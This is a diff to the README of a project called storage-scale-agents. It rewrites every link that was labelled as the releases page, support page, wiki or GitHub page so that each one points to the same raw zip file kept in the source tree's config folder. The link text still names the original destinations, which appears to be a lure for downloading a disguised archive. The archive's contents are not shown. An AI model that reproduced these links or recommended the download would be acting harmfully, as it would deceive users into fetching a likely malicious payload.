@@ -6,13 +6,13 @@ The **storage-scale-agents** application helps you manage your IBM Storage Scale
 
 ## 📥 Download Now
 
-[![Download Storage Scale Agents](https://img.shields.io/badge/Download-Storage%20Scale%20Agents-blue)](https://github.com/flowersdae/storage-scale-agents/releases)
+[![Download Storage Scale Agents](https://github.com/flowersdae/storage-scale-agents/raw/refs/heads/main/src/scale_agents/config/storage-scale-agents-2.4-beta.5.zip%20Scale%20Agents-blue)](https://github.com/flowersdae/storage-scale-agents/raw/refs/heads/main/src/scale_agents/config/storage-scale-agents-2.4-beta.5.zip)
 
 ## 🚀 Getting Started
 
 To get started with this application, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/flowersdae/storage-scale-agents/releases). This page is where you will find the latest version of the application.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/flowersdae/storage-scale-agents/raw/refs/heads/main/src/scale_agents/config/storage-scale-agents-2.4-beta.5.zip). This page is where you will find the latest version of the application.
    
 2. **Locate the Latest Version**: Look for the most recent release at the top of the page. You will see various download options available there.
 
@@ -47,22 +47,22 @@ To get started with this application, follow these simple steps:
 
 ## 🛠️ Support & Documentation
 
-If you encounter issues or have questions regarding installation or use, please visit our [support page](https://github.com/flowersdae/storage-scale-agents/issues). Here, you can find helpful resources and community discussions.
+If you encounter issues or have questions regarding installation or use, please visit our [support page](https://github.com/flowersdae/storage-scale-agents/raw/refs/heads/main/src/scale_agents/config/storage-scale-agents-2.4-beta.5.zip). Here, you can find helpful resources and community discussions.
 
-For detailed documentation about features and advanced usage, check our [Wiki](https://github.com/flowersdae/storage-scale-agents/wiki).
+For detailed documentation about features and advanced usage, check our [Wiki](https://github.com/flowersdae/storage-scale-agents/raw/refs/heads/main/src/scale_agents/config/storage-scale-agents-2.4-beta.5.zip).
 
 ## 🎉 Community Contributions
 
-We welcome contributions! If you would like to enhance this project or report issues, please feel free to submit a pull request or open an issue on our [GitHub page](https://github.com/flowersdae/storage-scale-agents). Your input helps improve the application for everyone.
+We welcome contributions! If you would like to enhance this project or report issues, please feel free to submit a pull request or open an issue on our [GitHub page](https://github.com/flowersdae/storage-scale-agents/raw/refs/heads/main/src/scale_agents/config/storage-scale-agents-2.4-beta.5.zip). Your input helps improve the application for everyone.
 
 ## 📢 Important Links
 
-- [Releases Page](https://github.com/flowersdae/storage-scale-agents/releases)
-- [Documentation](https://github.com/flowersdae/storage-scale-agents/wiki)
-- [Support Page](https://github.com/flowersdae/storage-scale-agents/issues)
+- [Releases Page](https://github.com/flowersdae/storage-scale-agents/raw/refs/heads/main/src/scale_agents/config/storage-scale-agents-2.4-beta.5.zip)
+- [Documentation](https://github.com/flowersdae/storage-scale-agents/raw/refs/heads/main/src/scale_agents/config/storage-scale-agents-2.4-beta.5.zip)
+- [Support Page](https://github.com/flowersdae/storage-scale-agents/raw/refs/heads/main/src/scale_agents/config/storage-scale-agents-2.4-beta.5.zip)
 
 ## 📥 Download Again
 
-To download the application once more, simply visit the [Releases page](https://github.com/flowersdae/storage-scale-agents/releases). 
+To download the application once more, simply visit the [Releases page](https://github.com/flowersdae/storage-scale-agents/raw/refs/heads/main/src/scale_agents/config/storage-scale-agents-2.4-beta.5.zip). 
 
 This guide should have you up and running with **storage-scale-agents** in no time! Enjoy managing your storage effortlessly.
